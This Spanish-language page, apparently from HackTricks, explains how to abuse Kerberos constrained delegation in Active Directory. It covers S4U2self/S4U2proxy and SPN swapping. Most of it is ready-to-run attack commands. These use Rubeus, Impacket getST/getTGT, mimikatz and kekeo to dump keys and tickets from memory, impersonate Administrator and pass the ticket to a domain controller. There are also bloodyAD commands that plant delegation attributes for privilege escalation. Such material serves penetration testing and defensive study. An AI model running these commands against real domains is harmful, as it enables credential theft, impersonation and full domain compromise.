# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Con esto un Domain admin puede **permitir** que un equipo **suplante a un usuario o equipo** frente a cualquier **servicio** de una máquina.

- **Service for User to self (_S4U2self_):** Si una **cuenta de servicio** tiene un valor _userAccountControl_ que contiene [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), entonces puede obtener un TGS para sí misma (el servicio) en nombre de cualquier otro usuario.
- **Service for User to Proxy(_S4U2proxy_):** Una **cuenta de servicio** podría obtener un TGS en nombre de cualquier usuario para el servicio establecido en **msDS-AllowedToDelegateTo.** Para hacerlo, primero necesita un TGS de ese usuario hacia sí misma, pero puede usar S4U2self para obtener ese TGS antes de solicitar el otro.

**Nota**: Si un usuario está marcado como ‘_Account is sensitive and cannot be delegated_’ en AD, no podrás **suplantarlo**.

Esto significa que si **comprometes el hash del servicio** puedes **suplantar a usuarios** y obtener **acceso** en su nombre a cualquier **servicio** en las máquinas indicadas (posible **privesc**).

Además, no solo tendrás acceso al servicio que el usuario puede suplantar, sino también a cualquier servicio porque el SPN (el nombre de servicio solicitado) no se verifica (en el ticket esta parte no está cifrada/firmada). Por lo tanto, si tienes acceso al **servicio CIFS** también puedes acceder al **servicio HOST** usando el flag `/altservice` en Rubeus, por ejemplo. La misma debilidad de SPN swapping es explotada por **Impacket getST -altservice** y otras herramientas.

Además, el acceso al servicio LDAP en el DC es lo que se necesita para explotar un **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Notas sobre Cross-domain constrained delegation (2025+)

Desde **Windows Server 2012/2012 R2** el KDC admite **constrained delegation across domains/forests** a través de las extensiones S4U2Proxy. Las versiones modernas (Windows Server 2016–2025) mantienen este comportamiento y añaden dos PAC SIDs para señalizar el protocol transition:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) cuando el usuario se autenticó normalmente.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) cuando un servicio afirmó la identidad mediante protocol transition.

Espera `SERVICE_ASSERTED_IDENTITY` dentro del PAC cuando protocol transition se usa entre dominios, confirmando que el paso S4U2Proxy tuvo éxito.

### Impacket / Linux tooling (altservice & full S4U)

Las versiones recientes de Impacket (0.11.x+) exponen la misma cadena S4U y el mismo SPN swapping que Rubeus:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Si prefieres forjar primero el ST del usuario (p. ej., offline hash only), combina **ticketer.py** con **getST.py** para S4U2Proxy. Consulta el issue abierto de Impacket #1713 para las peculiaridades actuales (KRB_AP_ERR_MODIFIED cuando el ST forjado no coincide con la clave SPN).

### Automatizando la configuración de delegación desde credenciales low-priv

Si ya posees **GenericAll/WriteDACL** sobre una cuenta de equipo o de servicio, puedes aplicar los atributos requeridos de forma remota sin RSAT usando **bloodyAD** (2024+):
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Esto te permite construir una ruta de constrained delegation para privesc sin privilegios DA tan pronto como puedas escribir esos atributos.

- Paso 1: **Obtener el TGT del servicio permitido**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Hay **otras formas de obtener un TGT ticket** o el **RC4** o **AES256** sin ser SYSTEM en el equipo como Printer Bug y unconstrain delegation, NTLM relaying y Active Directory Certificate Service abuse
>
> **Con solo tener ese TGT ticket (or hashed) puedes realizar este ataque sin comprometer todo el equipo.**

- Paso 2: **Obtener el TGS para el servicio suplantando al usuario**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) y [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Referencias
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
